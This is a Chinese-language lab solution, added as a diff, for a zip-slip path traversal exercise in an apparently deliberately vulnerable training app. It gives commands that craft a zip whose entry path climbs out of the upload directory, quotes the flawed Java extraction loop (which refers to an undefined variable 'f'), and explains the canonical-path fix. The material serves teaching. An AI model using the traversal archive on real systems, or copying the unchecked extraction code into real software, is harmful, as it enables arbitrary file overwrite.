@@ -1,0 +1,48 @@
+=== 解答
+
+首先，创建一个包含图片的 zip 文件：
+
+[source, subs="macros"]
+----
+curl -o webwolf.jpg webWolfRootLink:images/wolf.png[noLink, target=images/wolf.png]
+zip profile.zip webwolf.jpg
+----
+
+现在将其上传为个人资料图片。如练习中所述，由于软件存在缺陷，我们会看到操作没有成功，屏幕上显示：
+
+[source]
+----
+Zip file extracted successfully failed to copy the image. Please get in touch with our helpdesk.
+----
+
+接下来创建一个 zip 文件，让其中的路径先遍历到上层，再返回到练习中指定的目录。
+
+首先，创建目录结构：
+
+[source, subs="macros"]
+----
+mkdir -p webGoatTempDir:temppath[]PathTraversal/username:user[]
+cd webGoatTempDir:temppath[]PathTraversal/username:user[]
+curl -o username:user[].jpg webWolfRootLink:images/wolf.png[noLink, target=images/wolf.png]
+zip profile.zip ../../../../../../../..webGoatTempDir:temppath[]PathTraversal/username:user[]/username:user[].jpg
+----
+
+现在上传该 zip 文件，即可完成练习。
+
+=== 为什么会成功？
+
+开发人员在代码中使用了以下代码片段：
+
+[source%linenums]
+----
+ZipFile zip = new ZipFile(uploadedZipFile);
+Enumeration<? extends ZipEntry> entries = zip.entries();
+while (entries.hasMoreElements()) {
+  ZipEntry e = entries.nextElement();
+  File profilePicture = new File(uploadDirectory, e.getName());
+  InputStream is = zip.getInputStream(e);
+  Files.copy(is, f.toPath(), StandardCopyOption.REPLACE_EXISTING);
+}
+----
+
+修复方法是确保第 5 行生成的文件位于预期目录中。与路径遍历缓解措施相同，使用 `profilePicture.getCanonicalPath()` 确认路径符合预期。
